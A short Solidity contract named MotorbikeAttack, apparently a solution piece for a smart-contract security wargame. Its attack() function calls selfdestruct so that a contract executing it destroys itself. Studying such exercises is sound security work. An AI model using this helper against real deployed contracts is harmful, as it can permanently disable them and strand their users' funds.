// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

contract MotorbikeAttack {
    function attack() external {
        selfdestruct(address(0)); // In versions before 0.7.0, the address type was implicitly payable, so you don't need to explicitly cast it using payable
    }
}
